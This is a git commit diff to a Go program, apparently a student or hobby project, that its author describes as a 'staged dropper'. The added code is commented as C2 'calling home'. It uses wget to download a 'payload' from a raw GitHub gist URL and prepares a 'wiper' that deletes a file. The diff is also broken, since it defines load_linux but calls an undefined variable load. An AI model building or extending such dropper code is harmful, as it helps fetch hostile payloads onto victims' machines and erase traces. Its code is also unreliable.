2fd5827ae39d82e3633a2728afdafff62e94dced
Kolby Kiesling <kjk15b@acu.edu>
2023-01-29 08:12:46 -0600

    Continued building out for staged dropper

--- main.go
+++ main.go
@@ -2,12 +2,22 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
 )
 
 func main() {
-	load := exec.Command("echo hello")
-	remove := exec.Command("rm main")
+	// C2 calling home
+	gist := "https://gist.githubusercontent.com/kjk15b/370383505c4a8ed13a9eeaaee4642160/raw/cbca5e4390f7a47ad6ed730740397d6625786a7c/bat"
+	// Get the payload
+	load_linux := exec.Command("wget", gist)
+	// Prepare the wiper
+	remove := exec.Command("rm", "go-memes")
+	
+	load.Stdout = os.Stdout
+	load.Stderr = os.Stdout
+	
+	
 	if err := load.Run(); err != nil {
 		fmt.Println("ERROR: ", err)
 	}
